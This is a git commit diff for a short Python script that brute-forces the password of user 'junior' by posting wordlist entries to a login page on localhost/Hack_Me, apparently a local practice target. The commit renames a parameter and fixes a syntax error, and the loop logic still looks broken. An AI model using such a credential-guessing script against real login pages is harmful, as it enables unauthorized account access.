8f5eb598008b3cb5a7e885c37eb4436480c870fb
Gilmarfilho2003 <89646761+Gilmarfilho2003@users.noreply.github.com>
2021-09-22 11:09:35 -0300

    Update 3.py

--- 3.py
+++ 3.py
@@ -3,15 +3,15 @@ url = "http://localhost/Hack_Me"
 login_url = url+"/api/Login.php"
 arquivo = "junior.txt"
 usuario = "junior"
-def request(username, password):
-    data = {"nome": username, "senha": password}
+def request(user, password):
+    data = {"nome": user, "senha": password}
     r = requests.post(login_url, data=data)
     if "Logue novamente" in r.text:
         print("Nao foi possivel achar a senha!!")
     else:
         print("A senha e: "+user + " | "+ password)
         wordlist = open(arquivo, "r")
-for i in wordlist: junior.txt
+for i in wordlist:
     print("Testando "+ usuario + " || " + i)
     request(usuario,i)
     print("===============================")
